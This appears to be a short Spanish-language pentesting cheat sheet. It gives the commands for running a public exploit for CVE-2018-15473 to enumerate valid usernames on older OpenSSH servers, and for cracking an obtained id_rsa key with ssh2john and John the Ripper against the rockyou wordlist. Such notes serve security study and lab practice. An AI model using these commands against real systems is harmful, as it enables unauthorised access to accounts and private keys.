## Enumerar usuarios con SSH

En versiones entre la 2.3 y 7.7 de OpenSSH se pueden enumerar usuarios válidos del sistema con el siguiente [exploit SSH-Username-Enumeration CVE-2018-15473](https://github.com/Sait-Nuri/CVE-2018-15473)

Se clona el repositorio, se instala con
```bash
pip3 install -r requirements.txt
```

se lanza:

```bash
./CVE-2018-15473.py <ip> -u <username_dictionary>
```
### Fuerza bruta id_rsa hash SSH

Teniendo el fichero id_rsa, podemos intentar crackearlo por fuerza bruta. Para ello primero debemos pasarlo a un formato que entienda john the ripper:
```bash
ssh2john id_rsa > hash.txt
```

Con el hash.txt obtenido:
```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
